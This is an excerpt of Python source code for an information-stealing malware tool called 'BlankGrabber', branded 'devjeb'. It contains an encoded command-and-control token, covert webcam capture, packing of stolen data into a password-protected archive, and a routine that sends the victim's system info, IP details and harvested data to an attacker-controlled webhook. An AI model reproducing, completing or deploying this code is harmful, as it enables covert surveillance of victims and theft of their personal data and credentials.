...
class Settings:
    C2 = (1, base64.b64decode('Njk0ODMwMDc1MTpBQUhtZi14UGFYN2xkc2ZyNzJnd2FGTEYxUjZRQk1iVUwxayQxMDQ2MjkyNzMz').decode())
    Mutex = base64.b64decode('Y1lodjVaWkVRWHRoZ2w0bg==').decode()
    PingMe = bool('')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
...
Logger = logging.getLogger('devjeb')
...
class Syscalls:
    ...
    def CaptureWebcam(index: int, filePath: str) -> bool:
        ...
        hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR('devjeb'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
        result = False
        if hcam:
...
class BlankGrabber:
    ...
    def CreateArchive(self) -> tuple[str, str]:
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'devjeb123'
    ...
    def SendData(self) -> None:
        ...
        filename = 'devjeb-%s.%s' % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            case 0:
                image_url = 'https://raw.githubusercontent.com/devjeb-c/devjeb-Grabber/main/.github/workflows/image.png'
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'devjeb', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/devjeb-c/devjeb-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by devjeb | https://github.com/devjeb-c/devjeb-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'devjeb', 'avatar_url': image_url}
